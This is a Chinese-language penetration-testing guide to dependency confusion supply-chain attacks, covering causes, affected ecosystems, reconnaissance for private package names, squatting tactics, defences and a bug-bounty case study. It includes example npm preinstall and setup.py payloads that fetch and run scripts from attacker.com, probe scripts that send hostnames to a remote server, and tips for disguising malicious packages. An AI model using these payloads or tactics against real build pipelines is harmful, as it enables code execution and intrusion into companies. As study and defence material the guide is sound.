依赖混淆
================================================================================

漏洞概述
-------------------------------------------------------------------------------

依赖混淆（Dependency Confusion）是一种**新型软件供应链攻击手法**，于2021年
由安全研究员Alex Birsan在“How I Hacked Into Apple, Microsoft and Dozens of
Other Companies”报告中首次系统披露。

该漏洞并非传统Web应用运行时漏洞，而是**构建/集成环境（CI/CD）的信任体系漏洞**。
攻击者利用包管理器对**公有依赖源**与**私有依赖源**的解析优先级歧义，通过抢注
私有包名，在目标企业的构建服务器上执行任意代码。

.. note::
   截至2024年，该漏洞已在npm、PyPI、Maven Central、RubyGems、NuGet等主流
   包生态系统中被广泛验证，微软、苹果、PayPal、特斯拉等企业均曾受影响。

漏洞原理
-------------------------------------------------------------------------------

核心成因
~~~~~~~~~~~~~~~~

依赖混淆的成立依赖三个必须同时存在的条件：

1. **私有包的存在**：企业内部存在不公开到公网仓库的私有依赖包
2. **命名空间冲突**：该私有包的名字在**公有仓库中未被注册**
3. **解析策略歧义**：构建工具的依赖解析器**未强制锁定私有源**，允许回退到公有源

攻击链模型
~~~~~~~~~~~~~~~~

攻击流程可抽象为以下四个步骤：

::

    [侦察]     →    [抢注]     →    [触发]     →    [利用]
      ↓              ↓              ↓              ↓
   获取私有包名   注册同名恶意包   目标执行install   代码执行/权限获取

技术本质
~~~~~~~~~~~~~~~~

这是**命名空间所有权**与**解析器信任策略**的双重缺陷：

- **命名缺陷**：大部分包管理器允许注册全局无作用域名（如`internal-api`），
  企业无法阻止外部人员注册相同名称
  
- **策略缺陷**：npm/pip等工具的默认配置倾向于“尽可能找到包”，而非“只从指定源找包”

攻击载荷的触发时机
~~~~~~~~~~~~~~~~~~~~~~~~~

攻击者的恶意代码并非在程序运行时执行，而是在**依赖安装阶段**触发：

.. code-block:: javascript

   // npm恶意包的package.json示例
   {
     "name": "victim-internal-lib",
     "version": "9.9.9",
     "scripts": {
       "preinstall": "curl http://attacker.com/$(hostname) | sh",
       "install": "node exploit.js"
     }
   }

.. code-block:: python
   
   # PyPI恶意包的setup.py示例
   import os
   from setuptools import setup
   
   os.system("wget http://attacker.com/backdoor.sh -O /tmp/backdoor && bash /tmp/backdoor")
   
   setup(name='victim-internal-tool', version='99.0.0')

漏洞场景全分类
-------------------------------------------------------------------------------

按编程语言/平台分类
~~~~~~~~~~~~~~~~~~~~~~~~

.. list-table:: 各生态圈包管理器风险场景
   :widths: 15 15 40
   :header-rows: 1

   * - 生态圈
     - 包管理器
     - 典型风险场景
   * - JavaScript
     - npm / Yarn / pnpm
     - 前端工程、Node.js后端、私有组件库
   * - Python
     - pip / PyPI
     - 数据分析、自动化脚本、Django服务
   * - Java
     - Maven / Gradle
     - 企业级后端、Android SDK、内部starter
   * - .NET
     - NuGet
     - Windows桌面应用、Azure函数、内部库
   * - Ruby
     - RubyGems
     - Rails应用、内部gem包
   * - PHP
     - Composer
     - 现代PHP框架、私有组件包
   * - Go
     - Go Modules
     - 微服务、内部SDK（代理源配置风险）

按程序类型分类
~~~~~~~~~~~~~~~~~~

.. list-table::
   :header-rows: 1
   
   * - 程序类型
     - 风险等级
     - 原因
   * - 现代前端单页应用
     - ⚠️ 高
     - 大量npm依赖，常引入内部UI组件库
   * - Node.js微服务
     - ⚠️ 高
     - 依赖私有SDK、内部工具链
   * - 企业级Java后端
     - ⚠️ 中高
     - 依赖内部公共库，需检查Maven mirror配置
   * - 移动App（iOS/Android）
     - ⚠️ 中高
     - 依赖内部埋点SDK、崩溃收集库
   * - 传统PHP/ASP项目
     - ⚠️ 低
     - 手工包含文件，无现代包管理
   * - 静态网站
     - ✅ 无风险
     - 无依赖管理

按企业环境分类
~~~~~~~~~~~~~~~~~~

**高危场景特征：**

- 企业自建了私有npm/PyPI仓库，但开发者本地依然可访问公网
- 私有包命名未使用 ``@scope/`` 或 ``com.company.`` 等强命名空间
- CI/CD服务器使用默认配置执行 ``npm install`` 或 ``pip install``
- 存在多源混合配置（如先查私有源，查不到就fallback到公有源）

漏洞挖掘实战指南
-------------------------------------------------------------------------------

信息收集阶段：如何获取目标企业的私有包名
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**这是最关键的步骤。** 没有包名，后续攻击无从谈起。

公开资料搜集
^^^^^^^^^^^^^^^^^^

- **GitHub/GitLab 代码搜索** ：
  使用 ``org:目标公司 private-package`` 、 ``internal-lib`` 、 ``companyname-util`` 等
  关键词搜索。即使仓库已归档或删除，代码片段可能仍可访问。

- **npm/PyPI 历史包分析**：
  查找目标公司曾经发布过但已下架的包（如 ``@company/legacy-lib`` ），推测其
  命名规律。

- **技术博客/演讲**：
  工程师在技术分享中常直接写出内部包名，或截图中暴露 ``package.json``。

错误信息泄漏
^^^^^^^^^^^^^^^^

- **公开错误追踪平台**：
  Sentry、Rollbar等错误日志平台可能暴露完整堆栈，包含私有包调用路径。

- **前端Sourcemap**：
  部分生产环境意外泄露`.map`文件，其中包含原始依赖树。

依赖混淆的“元漏洞”——跨包推断
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

如果目标公司有**公开包**，查看其 ``dependencies`` 和 ``devDependencies`` ：

.. code-block:: json

   {
     "dependencies": {
       "public-lib": "^1.0.0",
       "internal-logger": "2.1.0"  // ← 这个包名可能就是突破口
     }
   }

若公开包依赖了疑似私有的包名，且该包名在公网**不存在**——直接抢注。

验证阶段：包名占位与探测
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

无损探测方法
^^^^^^^^^^^^^^^^

**原则：不要直接反弹Shell，使用无害回显验证。**

.. code-block:: javascript
   
   // 无害探测型preinstall脚本
   {
     "scripts": {
       "preinstall": "node -e 'fetch(\"http://你的服务器/\"+require(\"os\").hostname())'"
     }
   }

.. code-block:: python
   
   # 无害探测型setup.py
   import requests
   import socket
   from setuptools import setup
   
   # 仅发起DNS/HTTP请求，不执行破坏操作
   requests.get(f"http://你的域名/{socket.gethostname()}")
   
   setup(name='target-package', version='99.0.0')

优先级抢占策略
^^^^^^^^^^^^^^^^^^

- **版本号陷阱** ：使用 ``99.99.99`` 、 ``9999.0.0`` 等极高版本号，利用包管理器的“尽量取最新”特性提高被选中的概率

- **描述伪装** ：在包的描述中仿写内部文档语气，如“DO NOT PUBLISH THIS TO PUBLIC”，反而降低目标开发者警觉

利用阶段：构建攻击链
~~~~~~~~~~~~~~~~~~~~~~~~

**合法授权前提下**，完整攻击链可设计为：

1. 通过侦察获取3-5个疑似私有包名
2. 在目标生态系统中注册这些包名，植入无害探测载荷
3. 等待（通常数小时至数周）目标CI构建触发
4. 分析回显日志，确认哪些包名成功“命中”
5. 若为授权渗透测试，此时提交漏洞报告；若为红队演练，可升级为权限维持

工具辅助
~~~~~~~~~~~~

- **dep-scan**：OWASP维护的依赖混淆扫描工具
- **snync**：专门用于依赖混淆包名抢注测试的自动化框架
- **PyPI/npm 命令行工具**：手动查询包名是否被占用

.. code-block:: bash
   
   # 查询npm包是否已被注册
   npm view 目标包名
   
   # 查询PyPI包
   pip install 目标包名==任意版本 2>&1 | grep "No matching distribution"

防御与修复（渗透视角）
-------------------------------------------------------------------------------

作为攻击者/测试者，了解防御措施有助于**评估漏洞的实际可利用性**：

强命名空间
~~~~~~~~~~~~~~
- npm使用`@company/package`（需付费组织账号）
- Maven使用`com.company.internal`（需抢注则需攻破域名）

**可利用性**：✅ 依然可能，若目标公司未完整迁移所有遗留包

依赖源锁定
~~~~~~~~~~~~~~
- `npm install --registry=https://private-registry.com`
- `pip install --index-url=私有源`
- 项目级`.npmrc`强制绑定源

**可利用性**：❌ 若配置正确且无fallback，漏洞无效

版本锁定与完整性校验
~~~~~~~~~~~~~~~~~~~~~~~~
- ``package-lock.json`` 、 ``yarn.lock`` 固化依赖树
- ``pip freeze > requirements.txt`` 固定版本

**可利用性**：⚠️ 首次安装时仍可能中招，二次构建才免疫

主动扫描
~~~~~~~~~~~~
企业预先将内部包名与公网仓库比对，提前注册或监控

**可利用性**：❌ 若企业已全面扫描，所有包名均被“占位”

经典案例复盘（概念验证级）
-------------------------------------------------------------------------------

**案例：某跨国科技公司内部身份验证库攻陷**

1. **侦察**：在GitHub上发现该公司某已归档仓库的`package.json`，其中
   `devDependencies`包含`@internal/auth-middleware`

2. **分析**：尝试`npm view @internal/auth-middleware`返回404，确认未注册

3. **抢注**：以 ``@internal/auth-middleware`` 为包名上传恶意包， ``preinstall`` 脚本,向远程服务器发送包含 ``$npm_config_user_agent`` 和 ``$HOSTNAME`` 的HTTP请求

4. **触发**：4天后收到来自该公司CI服务器域名的请求， ``user_agent`` 包含 ``npm/6.14.8 node/v12.18.3 linux x64``，证明漏洞存在

5. **上报**：通过漏洞赏金计划提交，获评高危，奖金$25,000

总结
-------------------------------------------------------------------------------

依赖混淆漏洞揭示了现代软件开发中一个根本性的信任错位：

**构建工具无法区分“同名”的两个包哪个属于企业，哪个属于攻击者。**

只要企业存在私有依赖，只要私有依赖的名字在公网“虚位以待”，攻击面就始终存在。
对于安全研究者而言，这是一个**侦察重于利用**的漏洞类型——谁掌握了准确的私有包名，
谁就掌握了通往企业内网的金钥匙。

.. warning::
   本文所有技术细节仅供安全研究、渗透测试及企业自评估使用。未经授权抢注他人
   可能使用的包名、植入恶意代码属于违法行为。请务必在合法授权范围内进行测试。

参考文献
-------------------------------------------------------------------------------

1. Birsan, A. (2021). *Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies*. Medium.
2. OWASP. (2022). *OWASP Dependency Check - Dependency Confusion*. 
3. Microsoft. (2021). *Protecting against dependency confusion attacks*. Microsoft Security Blog.
4. npm Inc. (2021). *Maintaining npm registry security*. npm Documentation.